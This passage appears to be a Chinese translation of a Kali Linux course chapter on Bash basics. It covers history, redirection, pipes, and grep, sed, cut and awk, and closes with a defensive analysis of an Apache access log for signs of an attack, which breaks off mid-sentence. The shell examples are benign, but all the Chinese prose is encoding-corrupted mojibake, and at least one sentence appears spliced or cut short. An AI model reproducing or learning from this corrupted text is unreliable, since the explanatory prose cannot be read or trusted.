De[TAB]sktop/\n\nkali@kali:~$ ls Desktop/\n```\n\nå½“æˆ‘ä»¬åœ¨ \"D\" åé¢ç¬¬ä¸€æ¬¡æŒ‰ `TAB` é”®æ—¶ï¼ŒBash shell æç¤ºæœ‰ä¸‰ä¸ªä»¥è¯¥å­—æ¯å¼€å¤´çš„ç›®å½•ï¼Œç„¶åæ˜¾ç¤ºæˆ‘ä»¬éƒ¨åˆ†å®Œæˆçš„å‘½ä»¤ï¼Œè®©æˆ‘ä»¬ç»§ç»­ã€‚ç”±äºæˆ‘ä»¬å†³å®šæŒ‡å®š \"Desktop\"ï¼Œæˆ‘ä»¬æ¥ç€ç¬¬äºŒæ¬¡è¾“å…¥ \"e\"ï¼Œç„¶åæŒ‰ `TAB`é”®ã€‚åœ¨è¿™ä¸€ç‚¹ä¸Šï¼ŒBash shell ç¥å¥‡åœ°è‡ªåŠ¨å®Œæˆäº† \"Desktop\" è¿™ä¸ªè¯çš„å…¶ä½™éƒ¨åˆ†ï¼Œå› ä¸ºè¿™æ˜¯å”¯ä¸€ä»¥ \"De\" å¼€å¤´çš„é€‰é¡¹ã€‚å…³äºæ ‡ç­¾å®Œæˆçš„å…¶ä»–ä¿¡æ¯å¯ä»¥åœ¨ Debian ç½‘ç«™ä¸Šæ‰¾åˆ°ã€‚\n\n### Bash å†å²è®°å½•\n\nåœ¨è¿›è¡Œæ¸—é€æµ‹è¯•çš„æ—¶å€™ï¼Œè®°å½•åœ¨ Shell ä¸­è¾“å…¥çš„å‘½ä»¤æ˜¯å¾ˆé‡è¦çš„ã€‚å¹¸è¿çš„æ˜¯ï¼ŒBash ä¿ç•™äº†ä¸€ä¸ªå·²ç»è¾“å…¥çš„å‘½ä»¤çš„å†å²è®°å½•ï¼Œå¯ä»¥ç”¨ history å‘½ä»¤æ¥æ˜¾ç¤ºã€‚\n\n```bash\nkali@kali:~$ history\n 1 cat /etc/lsb-release\n 2 clear\n 3 history\n```\n\nä¸å…¶é‡æ–°è¾“å…¥å†å²è®°å½•ä¸­çš„é•¿å‘½ä»¤ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨å†å²è®°å½•çš„æ‰©å±•åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œå›é¡¾ Listingï¼Œå†å²ä¸Šæœ‰ä¸‰æ¡å‘½ä»¤ï¼Œæ¯æ¡å‘½ä»¤å‰é¢éƒ½æœ‰ä¸€ä¸ªè¡Œå·ã€‚è¦é‡æ–°è¿è¡Œç¬¬ä¸€æ¡å‘½ä»¤ï¼Œæˆ‘ä»¬åªéœ€è¾“å…¥ ! å­—ç¬¦å’Œè¡Œå·ï¼Œæœ¬ä¾‹ä¸­ä¸º 1ï¼Œå°±å¯ä»¥æ‰§è¡Œ cat /etc/lsb-release å‘½ä»¤ã€‚\n\n```bash\nkali@kali:~$ !1\ncat /etc/lsb-release\nDISTRIB_ID=Kali\nDISTRIB_RELEASE=kali-rolling\nDISTRIB_CODENAME=kali-rolling\nDISTRIB_DESCRIPTION=\"Kali GNU/Linux Rolling\"\n```\n\nå¦ä¸€ä¸ªæœ‰ç”¨çš„å†å²å¿«æ·é”®æ˜¯!!ï¼Œå®ƒé‡å¤æˆ‘ä»¬åœ¨ç»ˆç«¯ä¼šè¯ä¸­æ‰§è¡Œçš„æœ€åä¸€æ¡å‘½ä»¤ã€‚\n\n```bash\nkali@kali:~$ sudo systemctl restart apache2\n\nkali@kali:~$ !!\nsudo systemctl restart apache2\n\nkali@kali:~$\n```\n\né»˜è®¤æƒ…å†µä¸‹ï¼Œå‘½ä»¤å†å²è¢«ä¿å­˜åœ¨ç”¨æˆ·ä¸»ç›®å½•ä¸‹çš„ .bash_history æ–‡ä»¶ä¸­ã€‚æœ‰ä¸¤ä¸ªç¯å¢ƒå˜é‡æ§åˆ¶å†å²è®°å½•çš„å¤§å°ï¼šHISTSIZE å’Œ HISTFILESIZEã€‚\n\nHISTSIZE æ§åˆ¶å½“å‰ä¼šè¯å­˜å‚¨åœ¨å†…å­˜ä¸­çš„å‘½ä»¤æ•°é‡ï¼ŒHISTFILESIZE é…ç½®å†å²æ–‡ä»¶ä¸­ä¿å­˜çš„å‘½ä»¤æ•°é‡ã€‚è¿™äº›å˜é‡å¯ä»¥æ ¹æ®æˆ‘ä»¬çš„éœ€è¦è¿›è¡Œç¼–è¾‘ï¼Œå¹¶ä¿å­˜åœ¨ Bash é…ç½®æ–‡ä»¶ï¼ˆ.bashrcï¼‰ä¸­ã€‚\n\næ¢ç´¢ Bash å†å²çš„ä¸€ä¸ªæœ€ç®€å•çš„æ–¹æ³•æ˜¯ç›´æ¥ä»å‘½ä»¤è¡Œæç¤ºç¬¦ä¸­è¿›è¡Œã€‚æˆ‘ä»¬å¯ä»¥ç”¨ä¸€äº›æœ‰ç”¨çš„é”®ç›˜å¿«æ·é”®æ¥æµè§ˆå†å²è®°å½•ï¼Œå…¶ä¸­æœ€å¸¸ç”¨çš„æœ‰ä¸¤ä¸ªï¼š\n\n- `â–³` åœ¨å†å²ä¸­å‘åæ»šåŠ¨\n- `â–½` åœ¨å†å²ä¸­å‘å‰æ»šåŠ¨\n\næœ€åï¼ŒæŒ‰ä½ `Ctrl` é”®å¹¶æŒ‰ `R` é”®å°†ä½¿ç”¨åå‘-i-æœç´¢å·¥å…·ã€‚é”®å…¥ä¸€ä¸ªå­—æ¯ï¼Œä¾‹å¦‚ â€˜câ€™ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªåœ¨å†å²ä¸­åŒ…å«å­—æ¯ â€˜câ€™ çš„æœ€æ–°å‘½ä»¤çš„åŒ¹é…ã€‚ç»§ç»­è¾“å…¥ä»¥ç¼©å°åŒ¹é…èŒƒå›´ï¼Œå½“æ‰¾åˆ°æ‰€éœ€çš„å‘½ä»¤æ—¶ï¼ŒæŒ‰ `Return` æ¥æ‰§è¡Œå®ƒã€‚\n\n```bash\nkali@kali:~$ [CTRL-R]c\n(reverse-i-search)`ca': cat /etc/lsb-release\n```\n\n## ç®¡é“ç¬¦å’Œé‡å®šå‘\n\næ¯ä¸ªä»å‘½ä»¤è¡Œè¿è¡Œçš„ç¨‹åºéƒ½æœ‰ä¸‰ä¸ªæ•°æ®æµä¸ä¹‹ç›¸è¿ï¼Œä½œä¸ºä¸å¤–éƒ¨ç¯å¢ƒçš„é€šä¿¡æ¸ é“ã€‚è¿™äº›æ•°æ®æµå®šä¹‰å¦‚ä¸‹ï¼š\n\nç®¡é“ç¬¦ï¼ˆä½¿ç”¨ `|` æ“ä½œç¬¦ï¼‰å’Œé‡å®šå‘ï¼ˆä½¿ç”¨ `>` å’Œ `<` æ“ä½œç¬¦ï¼‰åœ¨ç¨‹åºå’Œæ–‡ä»¶ä¹‹é—´è¿æ¥è¿™äº›æµï¼Œä»¥é€‚åº”å‡ ä¹æ— é™å¤šçš„å¯èƒ½ä½¿ç”¨æƒ…å†µã€‚\n\n### é‡å®šå‘åˆ°ä¸€ä¸ªæ–°æ–‡ä»¶\n\nåœ¨å‰é¢çš„å‘½ä»¤ä¾‹å­ä¸­ï¼Œè¾“å‡ºè¢«æ‰“å°åˆ°å±å¹•ä¸Šã€‚è¿™åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹æ˜¯å¾ˆæ–¹ä¾¿çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ `>` æ“ä½œç¬¦å°†è¾“å‡ºä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œä»¥å¤‡å°†æ¥å‚è€ƒæˆ–æ“ä½œã€‚\n\n```bash\nkali@kali:~$ ls\nDesktop Documents Downloads Music Pictures Public Templates Videos\n\nkali@kali:~$ echo \"test\"\ntest\n\nkali@kali:~$ echo \"test\" > redirection_test.txt\n\nkali@kali:~$ ls\nDesktop Documents Downloads Music Pictures Public redirection_test.txt Template\n\nkali@kali:~$ cat redirection_test.txt\ntest\n\nkali@kali:~$ echo \"Kali Linux is an open source project\" > redirection_test.txt\nkali@kali:~$ cat redirection_test.txt\n\nKali Linux is an open source project\n```\n\n<aside> ğŸ’¡ å¦‚æœæˆ‘ä»¬å°†è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å°†è¢«è‡ªåŠ¨åˆ›å»ºã€‚ç„¶è€Œï¼Œå¦‚æœæˆ‘ä»¬æŠŠè¾“å‡ºä¿å­˜åˆ°ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶çš„å†…å®¹å°†è¢«æ›¿æ¢ã€‚å¯¹é‡å®šå‘è¦å°å¿ƒï¼æ²¡æœ‰æ’¤é”€çš„åŠŸèƒ½ï¼\n\n</aside>\n\n### é‡å®šå‘åˆ°ä¸€ä¸ªç°æœ‰çš„æ–‡ä»¶\n\nè¦å°†é¢å¤–çš„æ•°æ®é™„åŠ åˆ°ä¸€ä¸ªç°æœ‰çš„æ–‡ä»¶ï¼ˆè€Œä¸æ˜¯è¦†ç›–è¯¥æ–‡ä»¶ï¼‰ï¼Œè¯·ä½¿ç”¨ `>>` æ“ä½œç¬¦ã€‚\n\n```bash\nkali@kali:~$ echo \"that is maintained and funded by Offensive Security\" >>\nredirection_test.txt\nkali@kali:~$ cat redirection_test.txt\nKali Linux is an open source project\nthat is maintained and funded by Offensive Security\n```\n\n### ä»ä¸€ä¸ªæ–‡ä»¶é‡å®šå‘\n\nå¯ä»¥ä½¿ç”¨ `<` æ“ä½œç¬¦æ¥å‘é€æ•°ä»–æ–¹å¼â€ã€‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œç›´æ¥ç”¨æ¥è‡ªä¸Šä¸€èŠ‚ä¸­ç”Ÿæˆçš„æ•°æ®é‡å®šå‘ wc å‘½ä»¤çš„ STDINã€‚ç”¨ wc -m æ¥è®¡ç®—æ–‡ä»¶ä¸­çš„å­—ç¬¦æ•°è¯•è¯•ï¼š\n\n```bash\nkali@kali:~$ wc -m < redirection_test.txt\n89\n```\n\n<aside> ğŸ’¡ è¿™å®é™…ä¸Šæ˜¯å°†æˆ‘ä»¬çš„æ–‡ä»¶å†…å®¹â€œè¿æ¥â€åˆ° wc -m å‘½ä»¤çš„æ ‡å‡†è¾“å…¥ã€‚\n\n</aside>\n\n### é‡å®šå‘ STDERR\n\næ ¹æ® POSIX è§„èŒƒï¼ŒSTDINã€STDOU å’Œ STDERR çš„æ–‡ä»¶æè¿°ç¬¦åˆ†åˆ«å®šä¹‰ä¸º 0ã€1 å’Œ 2ã€‚è¿™äº›æ•°å­—å¾ˆé‡è¦ï¼Œå› ä¸ºåœ¨æ‰§è¡Œæˆ–å°†ä¸åŒçš„å‘½ä»¤è¿æ¥åœ¨ä¸€èµ·æ—¶ï¼Œå®ƒä»¬å¯ä»¥ç”¨æ¥æ“ä½œæ¥è‡ªå‘½ä»¤è¡Œçš„ç›¸åº”æ•°æ®æµã€‚\n\nä¸ºäº†æ›´å¥½çš„æŒæ¡æ–‡ä»¶æè¿°ç¬¦æ•°å­—çš„å·¥ä½œåŸç†ï¼Œè€ƒè™‘è¿™ä¸ªé‡å®šå‘æ ‡å‡†é”™è¯¯ï¼ˆSTDERRï¼‰çš„ä¾‹å­ã€‚\n\n```bash\nkali@kali:~$ ls .\nDesktop Documents Downloads Music Pictures Public redirection_test.txt Template\n\nkali@kali:~$ ls ./test\nls: cannot access '/test': No such file or directory\n\nkali@kali:~$ ls ./test 2>error.txt\n\nkali@kali:~$ cat error.txt\nls: cannot access '/test': No such file or directory\n```\n\n<aside> ğŸ’¡ error.txt åªåŒ…å«é”™è¯¯ä¿¡æ¯ï¼ˆåœ¨ STDERR ä¸Šç”Ÿæˆï¼‰ã€‚æˆ‘ä»¬é€šè¿‡åœ¨ â€œ>â€ æ“ä½œç¬¦å‰åŠ ä¸Šæµç¼–å·æ¥åšåˆ°è¿™ä¸€ç‚¹ï¼ˆ2=STDERRï¼‰ã€‚\n\n</aside>\n\n### ç®¡é“ç¬¦\n\nç»§ç»­ä½¿ç”¨ wc å‘½ä»¤çš„ä¾‹å­ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•å°†ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°å¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ã€‚è¯·çœ‹è¿™ä¸ªä¾‹å­ï¼š\n\n```bash\nkali@kali:~$ cat error.txt\nls: cannot access '/test': No such file or directory\n\nkali@kali:~$ cat error.txt | wc -m\n53\n\nkali@kali:~$ cat error.txt | wc -m > count.txt\n\nkali@kali:~$ cat count.txt\n53\n```\n\næˆ‘ä»¬ä½¿ç”¨ç®¡é“ç¬¦ `|` å°† cat å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ° wc å‘½ä»¤çš„è¾“å…¥ã€‚è¿™ä¸ªæ¦‚å¿µçœ‹èµ·æ¥å¾ˆå¾®ä¸è¶³é“ï¼Œä½†å°†ä¸åŒçš„å‘½ä»¤ç”¨ç®¡é“è¿æ¥èµ·æ¥æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œå¯ä»¥æ“ä½œå„ç§æ•°æ®ã€‚\n\n## æ–‡æœ¬æœç´¢å’Œæ“ä½œ\n\nå¯ä»¥é€šè¿‡å‡ ä¸ªå‘½ä»¤æ¥æé«˜æ–‡ä»¶å’Œæ–‡æœ¬å¤„ç†çš„æ•ˆç‡ï¼š grepã€sedã€cut å’Œ awkã€‚å¯¹å…¶ä¸­ä¸€äº›å·¥å…·çš„é«˜çº§ä½¿ç”¨éœ€è¦å¯¹æ­£åˆ™åŒ¹é…å¼ï¼ˆregexï¼‰çš„å·¥ä½œåŸç†æœ‰ä¸€ä¸ªå¾ˆå¥½çš„ç†è§£ã€‚æ­£åˆ™è¡¨è¾¾å¼æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡æœ¬å­—ç¬¦ä¸²ï¼Œç”¨äºæè¿°æœç´¢æ¨¡å¼ã€‚\n\næ­£åˆ™è¡¨è¾¾å¼å­¦ä¹ ç½‘å€ï¼š\n\n> https://www.regular-expressions.info/\n\n> http://www.rexegg.com/\n\n### Grep\n\ngrep æœç´¢æ–‡æœ¬æ–‡ä»¶ä¸­å‡ºç°çš„ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¹¶å°†åŒ…å«åŒ¹é…ç»“æœçš„ä»»ä½•ä¸€è¡Œè¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼Œè¿™é€šå¸¸æ˜¯ç»ˆç«¯å±å¹•ã€‚ä¸€äº›æœ€å¸¸ç”¨çš„é€‰é¡¹åŒ…æ‹¬ç”¨äºé€’å½’æœç´¢çš„ `-r` å’Œç”¨äºå¿½ç•¥æ–‡æœ¬å¤§å°å†™çš„ `-i` ã€‚ä¾‹å­ï¼š\n\n```bash\nkali@kali:~$ ls -la /usr/bin | grep zip\n-rwxr-xr-x 3 root root 34480 Jan 29 2017 bunzip2\n-rwxr-xr-x 3 root root 34480 Jan 29 2017 bzip2\n-rwxr-xr-x 1 root root 13864 Jan 29 2017 bzip2recover\n-rwxr-xr-x 2 root root 2301 Mar 14 2016 gunzip\n-rwxr-xr-x 1 root root 105172 Mar 14 2016 gzip\n```\n\nç”¨ ls åˆ—å‡ºäº† /usr/bin ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå¹¶å°†è¾“å‡ºç»“æœè¾“å…¥åˆ° grep å‘½ä»¤ï¼Œè¯¥å‘½ä»¤æœç´¢åŒ…å«äº† â€œzipâ€ å­—ç¬¦ä¸²çš„ä»»ä½•ä¸€è¡Œã€‚äº†è§£ grep å·¥å…·ä»¥åŠä½•æ—¶ä½¿ç”¨å®ƒå¯ä»¥è¯æ˜æ˜¯éå¸¸æœ‰ç”¨çš„ã€‚\n\n### Sed\n\nsed æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æµç¼–è¾‘å™¨ã€‚å®ƒä¹Ÿæ˜¯éå¸¸å¤æ‚çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™é‡Œåªç®€å•åœ°ä»‹ç»ä¸€ä¸‹å®ƒçš„è¡¨é¢ã€‚åœ¨ä¸€ä¸ªéå¸¸é«˜çš„æ°´å¹³ä¸Šï¼Œsed åœ¨ä¸€ä¸ªæ–‡æœ¬æµä¸Šæ‰§è¡Œæ–‡æœ¬ç¼–è¾‘ï¼Œå¯ä»¥æ˜¯ä¸€ç»„ç‰¹å®šçš„æ–‡ä»¶æˆ–æ ‡å‡†è¾“å‡ºã€‚è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªä¾‹å­ï¼š\n\n```bash\nkali@kali:~$ echo \"I need to try hard\" | sed 's/hard/harder/'\nI need to try harder\n```\n\nåœ¨åˆ—è¡¨ä¸­ï¼Œæˆ‘ä»¬ç”¨ echo å‘½ä»¤åˆ›å»ºäº†ä¸€ä¸ªæ–‡æœ¬æµï¼Œç„¶åå°†å…¶è¾“å‡ºåˆ° sedï¼Œä»¥ä¾¿å°† â€œhardâ€ æ›¿æ¢ä¸º â€œharderâ€ã€‚æ³¨æ„ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œè¾“å‡ºå·²è¢«é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºã€‚\n\n### Cut\n\ncut å‘½ä»¤å¾ˆç®€å•ï¼Œä½†ç»å¸¸æ´¾ä¸Šç”¨åœºã€‚å®ƒç”¨äºä»ä¸€è¡Œä¸­æå–ä¸€æ®µæ–‡æœ¬ï¼Œå¹¶å°†å…¶è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚ä¸€äº›æœ€å¸¸ç”¨çš„é€‰é¡¹åŒ…æ‹¬ï¼š `-f` è¡¨ç¤ºæˆ‘ä»¬è¦å‰ªåˆ‡çš„å­—æ®µç¼–å·ï¼Œ `-d` è¡¨ç¤ºå­—æ®µåˆ†éš”ç¬¦ã€‚\n\n```bash\nkali@kali:~$ echo \"I hack binaries,web apps,mobile apps, and just about anything else\"| cut -f 2 -d \",\"\nweb apps\n```\n\næˆ‘ä»¬å‘¼å‡ºäº†ä¸€è¡Œæ–‡æœ¬ï¼Œå¹¶å°†å…¶è¾“é€åˆ° cut å‘½ä»¤ä¸­ï¼Œç”¨é€—å·ï¼ˆ,ï¼‰ä½œä¸ºå­—æ®µåˆ†éš”ç¬¦æå–ç¬¬äºŒä¸ªå­—æ®µã€‚åŒæ ·çš„å‘½ä»¤å¯ä»¥ç”¨äºæ–‡æœ¬æ–‡ä»¶ä¸­çš„è¡Œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼Œé€šè¿‡ä½¿ç”¨å†’å·ï¼ˆ:ï¼‰ä½œä¸ºåˆ†éš”ç¬¦å’Œæ£€ç´¢ç¬¬ä¸€ä¸ªå­—æ®µï¼Œä» /etc/passwd ä¸­æå–äº†ä¸€ä¸ªç”¨æˆ·åˆ—è¡¨ï¼š\n\n```bash\nkali@kali:~$ cut -d \":\" -f 1 /etc/passwd\nroot\ndaemon\nbin\nsys\nsync\ngames\n...\n```\n\n### Awk\n\nawk æ˜¯ä¸€ç§ä¸ºæ–‡æœ¬å¤„ç†è€Œè®¾è®¡çš„ç¼–ç¨‹è¯­è¨€ï¼Œé€šå¸¸è¢«ç”¨ä½œæ•°æ®æå–å’ŒæŠ¥å‘Šå·¥å…·ã€‚å®ƒçš„åŠŸèƒ½ä¹Ÿéå¸¸å¼ºå¤§ï¼Œå¯ä»¥è¯´æ˜¯ç›¸å½“å¤æ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™é‡Œåªä»‹ç»ä¸€ä¸‹è¡¨é¢æƒ…å†µã€‚awk çš„ä¸€ä¸ªå¸¸ç”¨é€‰é¡¹æ˜¯ï¼š `-F` ï¼Œå®ƒæ˜¯å­—æ®µåˆ†éš”ç¬¦ï¼Œè€Œ print å‘½ä»¤åˆ™æ˜¯è¾“å‡ºç»“æœæ–‡æœ¬ã€‚\n\n```bash\nkali@kali:~$ echo \"hello::there::friend\" | awk -F \"::\" '{print $1, $3}'\nhello friend\n```\n\næˆ‘ä»¬è¾“å‡ºäº†ä¸€è¡Œï¼Œå¹¶æŠŠå®ƒè¾“é€ç»™ awkï¼Œç”¨ â€œ::â€ ä½œä¸ºå­—æ®µåˆ†éš”ç¬¦æå–ç¬¬ä¸€ä¸ª ï¼ˆ$1ï¼‰å’Œç¬¬ä¸‰ä¸ªï¼ˆ$3ï¼‰å­—æ®µã€‚æˆ‘ä»¬ä½¿ç”¨çš„ cut å’Œ awk ä¾‹å­ä¹‹é—´æœ€çªå‡ºçš„åŒºåˆ«æ˜¯ï¼Œcut åªæ¥å—ä¸€ä¸ªå­—ç¬¦ä½œä¸ºå­—æ®µåˆ†éš”ç¬¦ï¼Œè€Œ awk åˆ™è¦çµæ´»çš„éƒ½å¤šã€‚ä½œä¸ºä¸€ä¸ªä¸€èˆ¬çš„ç»éªŒæ³•åˆ™ï¼Œå½“ä½ å¼€å§‹æœ‰ä¸€ä¸ªæ¶‰åŠå¤šä¸ªå‰ªåˆ‡æ“ä½œçš„å‘½ä»¤æ—¶ï¼Œä½ å¯èƒ½è¦è€ƒè™‘è¯¥ç”¨ awkã€‚\n\n### å®ä¾‹\n\næˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ª Apache HTTP æœåŠ¡å™¨æ—¥å¿—ï¼ˆhttp://www.offensive-security.com/pwk-files/access_log.txt.gzï¼‰ï¼Œå®ƒåŒ…å«äº†ä¸€ä¸ªæ”»å‡»çš„è¯æ®ã€‚æˆ‘ä»¬çš„ä»»åŠ¡æ˜¯ä½¿ç”¨ Bash å‘½ä»¤æ¥æ£€æŸ¥è¯¥æ–‡ä»¶ï¼Œå¹¶å‘ç°å„ç§ä¿¡æ¯ï¼Œä¾‹å¦‚è°æ˜¯æ”»å‡»è€…å’ŒæœåŠ¡å™¨ä¸Šåˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆã€‚\n\né¦–å…ˆï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ head å’Œ wc å‘½ä»¤å¿«é€Ÿæµè§ˆä¸€ä¸‹æ—¥å¿—æ–‡ä»¶ï¼Œäº†è§£å…¶ç»“æ„ã€‚head å‘½ä»¤æ˜¾ç¤ºæ–‡ä»¶ä¸­çš„å‰10è¡Œï¼Œè€Œ wc å‘½ä»¤ï¼Œè¿åŒ `-l` é€‰é¡¹ï¼Œæ˜¾ç¤ºæ–‡ä»¶ä¸­çš„æ€»è¡Œæ•°ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# gunzip access_log.txt.gz                                                           9 â¨¯\n                                                                                           \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# mv access_log.txt access.log                   \n                                                                                                                                                                                                                    \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# head access.log \n201.21.152.44 - - [25/Apr/2013:14:05:35 -0700] \"GET /favicon.ico HTTP/1.1\" 404 89 \"-\" \"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31\" \"random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:48 -0700] \"GET /include/jquery.jshowoff.min.js HTTP/1.1\" 200 2553 \"<http://www.random-site.com/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"www.random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:48 -0700] \"GET /include/main.css HTTP/1.1\" 304 - \"<http://www.random-site.com/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"www.random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:49 -0700] \"GET /images/menu/2ny.png HTTP/1.1\" 200 2732 \"<http://www.random-site.com/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"www.random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:58 -0700] \"GET /chicago/ HTTP/1.1\" 200 7451 \"<http://www.random-site.com/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:58 -0700] \"GET /include/jquery.js HTTP/1.1\" 304 - \"<http://random-site.com/chicago/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:59 -0700] \"GET /images/header.png HTTP/1.1\" 200 13610 \"<http://random-site.com/chicago/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:11:00 -0700] \"GET /favicon.ico HTTP/1.1\" 404 89 \"<http://random-site.com/chicago/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"random-site.com\"\n88.112.192.2 - - [25/Apr/2013:14:11:13 -0700] \"GET / HTTP/1.1\" 200 4135 \"<http://startuplife.fi/you-know-you-are-in-san-francisco-when-your-favorite-spare-time-activities-include-eating-or-drinking/>\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31\" \"www.random-site.com\"\n88.112.192.2 - - [25/Apr/2013:14:11:14 -0700] \"GET /include/jquery.jshowoff.min.js HTTP/1.1\" 200 6227 \"<http://www.random-site.com/>\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31\" \"www.random-site.com\"\n                                                                                                                                                                                                                    \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# wc -l access.log \n1173 access.log\n```\n\nè¯·æ³¨æ„ï¼Œè¯¥æ—¥å¿—æ–‡ä»¶æ˜¯åŸºäºæ–‡æœ¬çš„ï¼ŒåŒ…å«ä¸åŒçš„å­—æ®µï¼ˆIPåœ°å€ã€æ—¶é—´æˆ³ã€HTTP è¯·æ±‚ç­‰ï¼‰ï¼Œå¹¶ä»¥ç©ºæ ¼ä¸ºç•Œã€‚è¿™æ˜¯ä¸€ä¸ªå®Œç¾çš„ â€œgrep å‹å¥½å‹â€æ–‡ä»¶ï¼Œå¯¹äºæˆ‘ä»¬åˆ°ç›®å‰ä¸ºæ­¢æ‰€æ¶‰åŠçš„æ‰€æœ‰å·¥å…·éƒ½èƒ½å¾ˆå¥½åœ°å·¥ä½œã€‚æˆ‘ä»¬å°†é¦–å…ˆæœç´¢è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­è®°å½•çš„æ‰€æœ‰ IP åœ°å€å‘æœåŠ¡å™¨å‘å‡ºçš„ HTTP è¯·æ±‚ã€‚æˆ‘ä»¬å°†é€šè¿‡ç®¡é“å°† cat å‘½ä»¤çš„è¾“å‡ºè¾“å…¥åˆ° cut å’Œ sort å‘½ä»¤ä¸­æ¥å®Œæˆè¿™ä¸€å·¥ä½œã€‚è¿™å¯èƒ½ä¼šç»™æˆ‘ä»¬æä¾›ä¸€ä¸ªçº¿ç´¢ï¼Œå‘Šè¯‰æˆ‘ä»¬éœ€è¦å¤„ç†çš„æ½œåœ¨æ”»å‡»è€…çš„æ•°é‡ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat access.log|cut -d \" \" -f 1|sort -u\n201.21.152.44\n208.115.113.91\n208.54.80.244\n208.68.234.99\n70.194.129.34\n72.133.47.242\n88.112.192.2\n98.238.13.253\n99.127.177.95\n```\n\næˆ‘ä»¬çœ‹åˆ°ï¼Œåœ¨æ—¥å¿—æ–‡ä»¶ä¸­è®°å½•çš„ IP åœ°å€ä¸åˆ°åä¸ªï¼Œå°½ç®¡è¿™ä»ç„¶ä¸èƒ½å‘Šè¯‰æˆ‘ä»¬å…³äºæ”»å‡»è€…çš„ä»»ä½•ä¿¡æ¯ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨ uniq å’Œ sort æ¥æ˜¾ç¤ºå”¯ä¸€çš„è¡Œï¼Œè¿›ä¸€æ­¥ç»†åŒ–æˆ‘ä»¬çš„è¾“å‡ºï¼Œå¹¶æŒ‰æ¯ä¸ª IP åœ°å€è®¿é—®æœåŠ¡å™¨çš„æ¬¡æ•°æ¥æ’åºã€‚uniq çš„ `-c` é€‰é¡¹å°†åœ¨è¾“å‡ºè¡Œå‰åŠ 